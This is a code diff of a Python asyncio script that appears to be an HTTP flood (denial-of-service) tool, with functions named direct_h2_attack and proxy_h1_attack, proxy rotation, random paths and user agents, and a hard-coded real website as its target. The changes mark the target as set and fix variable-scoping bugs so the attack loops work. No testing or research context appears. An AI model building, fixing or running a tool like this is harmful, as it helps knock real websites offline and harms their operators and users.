@@ -6,7 +6,7 @@ import random
 import time
 
 # ================= CONFIG =================
-TARGET = "https://sts-network.vercel.app/"  # CHANGE THIS
+TARGET = "https://sts-network.vercel.app/"  # TARGET SET
 PROXY_FILE = "proxies.txt"
 # Connection limits
 DIRECT_CONNECTIONS = 5      # HTTP/2 connections WITHOUT proxies
@@ -23,7 +23,7 @@ proxy_semaphore = None  # To limit total proxy concurrency
 
 # ================= LOGGING =================
 def log_status():
-    global last_log_time
+    global last_log_time, total_requests, last_status
     current_time = time.time()
     if current_time - last_log_time >= 10:
         last_log_time = current_time
@@ -81,7 +81,6 @@ async def direct_h2_attack():
     
     # Attack function
     async def send_h2_request(session):
-        nonlocal total_requests, last_status
         while running:
             try:
                 path = random.choice([
@@ -154,7 +153,6 @@ async def proxy_h1_attack(proxies):
     print(f"[+] Proxy sessions created: {len(proxy_sessions)}")
     
     async def send_proxy_request(session, proxy):
-        nonlocal total_requests, last_status
         while running:
             async with proxy_semaphore:  # Enforce global limit
                 try:
@@ -204,6 +202,7 @@ def get_random_ua():
 
 async def log_worker():
     """Log status every 10 seconds"""
+    global running
     while running:
         log_status()
         await asyncio.sleep(10)
